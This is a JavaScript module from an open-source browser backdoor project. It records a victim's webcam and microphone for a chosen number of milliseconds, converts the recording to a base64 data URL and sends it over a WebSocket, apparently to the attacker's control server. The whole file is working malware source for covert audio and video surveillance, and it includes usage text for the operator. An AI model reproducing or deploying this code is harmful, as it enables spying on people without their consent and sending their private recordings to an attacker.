// INTERACTIVE
/**
 * @file webcamMicrophone Module
 * @summary Record webcam or microphone for a certain amount of time
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

/**
 * @param {Boolean} video - Enable or disable video recording.
 * @param {Boolean} audio - Enable or disable audio recording.
 * @param {String} time - Milliseconds of time to record.
 * @return {String} |error|
 * @return {String} Base64 encoded webm file
 */
webcamMicrophone = function(video, audio, time) {
    navigator.webkitGetUserMedia({
        video: video,
        audio: audio
    }, function(localMediaStream) {
        var recordedChunks = [];

        var mediaRecorder = new MediaRecorder(localMediaStream);
        mediaRecorder.ondataavailable = handleDataAvailable;
        mediaRecorder.start();
        setTimeout(function(mediaRecorder, recordedChunks) {
            mediaRecorder.stop();
            for (var i = 0; i < localMediaStream.getTracks().length; i++) {
                localMediaStream.getTracks()[i].stop();
            }
            sendData(recordedChunks);
        }, time, mediaRecorder, recordedChunks);


        function handleDataAvailable(event) {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        }

    }, function(error) {
        ws.send("Error recording " + (video ? 'video' : 'audio') + ": " + error.message);
    });

    function sendData(chunks) {
        var blob = new Blob(chunks, {
            type: (video ? 'video' : 'audio') + '/webm'
        });
        var blobUrl = URL.createObjectURL(blob);
        var xhr = new XMLHttpRequest;
        xhr.responseType = 'blob';

        xhr.onload = function() {
            var recoveredBlob = xhr.response;

            var reader = new FileReader;

            reader.onload = function() {
                var blobAsDataUrl = reader.result;
                ws.send("Webm data URL: " + blobAsDataUrl);
            };

            reader.readAsDataURL(recoveredBlob);
        };

        xhr.open('GET', blobUrl);
        xhr.send();
    }

}

ws.send("\nUsage: webcamMicrophone(video, audio, time)\n- video is a boolean value for recording the webcam.\n- audio is a boolean value for recording the microphone.\n- time is the length of time in milliseconds to record.");
